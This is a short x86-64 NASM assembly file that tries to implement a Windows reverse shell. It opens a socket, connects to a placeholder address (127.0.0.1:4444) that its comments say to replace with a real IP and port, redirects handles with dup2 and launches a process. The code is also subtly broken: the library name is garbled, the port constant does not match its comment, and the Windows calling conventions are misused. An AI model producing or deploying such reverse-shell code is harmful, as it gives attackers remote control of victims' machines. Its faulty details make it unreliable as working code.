[BITS 64]

section .text
global _start

extern LoadLibraryA
extern WSAStartup
extern socket
extern connect
extern dup2
extern CreateProcessA

_start:
    mov rax, 0x636c61632e5f3277
    push rax
    mov rcx, rsp
    call LoadLibraryA

    mov rax, 0x202
    push rax
    mov rsi, rsp
    xor eax, eax
    call WSAStartup

    mov rcx, 2
    mov rdx, 1
    xor r8, r8
    call socket

    mov rdi, rax

    xor rbx, rbx
    mov bx, 0x5C11              ; Change this with the real net port (0x5c11 is 4444)
    shl rbx, 16
    add rbx, 0x7F000001         ; Add IP address 127.0.0.1 (loopback in Big Endian) change it with the real ip
    push rbx
    mov rsi, rsp

    mov rcx, rdi
    mov rdx, rsi
    mov r8, 16
    call connect

    xor rsi, rsi
dup_loop:
    mov rcx, rdi
    mov rdx, rsi
    call dup2
    inc rsi
    cmp rsi, 3
    jl dup_loop

    mov rcx, rsp
    push rdi
    mov rax, CreateProcessA
    call rax

